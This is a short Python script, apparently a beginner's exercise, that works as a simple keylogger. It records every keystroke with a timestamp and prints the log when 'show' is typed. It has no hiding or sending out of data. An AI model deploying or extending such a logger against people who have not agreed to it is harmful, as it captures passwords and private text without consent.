import keyboard                      #Import a library that records keyboard keystrokes.
from datetime import datetime            #Import a library that records date and time.


dicti = {}                                          #A dictionary for saving input from the keyboard.
dicti_for_show = {"all times":''}

def on_key_press(key):                             #A function that receives input from another function (which records the keyboard), and inserts it into a dictionary entry whose key is the current date and time.
    global dicti_for_show,dicti
    key = key.name
    key = key.lower()
    currentTime = datetime.now().strftime('%d/%m/%y %H:%M')

    if currentTime not in dicti:
        dicti[currentTime] = ''

    dicti[currentTime] += key
    dicti_for_show["all times"] += key


    if "show" in dicti_for_show["all times"]:
        for k,v in dicti.items():                     #A loop that checks if the sequence of words "show" exists.
            print("****",k,"****")                  #If this sequence exists, then the software will print everything that has been saved so far, and empty the dictionary.
            print(v,end = "\n")
        dicti = {}
        dicti_for_show = {"all times": ''}




#For checking the current file.
if __name__ == "__main__":
    keyboard.on_press(on_key_press)               #function call.
    keyboard.wait('Ctrl + Shift + .')           #Calling a function that terminates the program.
